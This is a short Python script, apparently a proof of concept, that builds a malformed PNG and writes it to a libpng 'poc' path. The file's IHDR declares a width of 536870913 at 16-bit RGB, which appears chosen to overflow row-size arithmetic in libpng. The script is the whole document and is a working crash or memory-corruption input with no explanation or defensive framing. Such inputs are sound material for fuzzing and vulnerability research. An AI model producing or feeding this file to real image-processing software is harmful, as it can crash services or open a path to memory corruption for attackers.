import struct
import zlib
width=536870913
height=1
bit_depth=16
color_type=2
compression=0
filter_method=0
interlace=0
ihdr_data=struct.pack('>IIBBBBB', width, height, bit_depth, color_type, compression, filter_method, interlace)
ihdr_length=struct.pack('>I', len(ihdr_data))
ihdr_type=b'IHDR'
crc=struct.pack('>I', zlib.crc32(ihdr_type + ihdr_data) & 0xffffffff)
ihdr_chunk=ihdr_length + ihdr_type + ihdr_data + crc
iend_chunk=b'\x00\x00\x00\x00IEND\xaeB`\x82'
png_signature=b'\x89PNG\r\n\x1a\n'
png_data=png_signature + ihdr_chunk + iend_chunk
with open('poc/libpng/input.png', 'wb') as f:
    f.write(png_data)
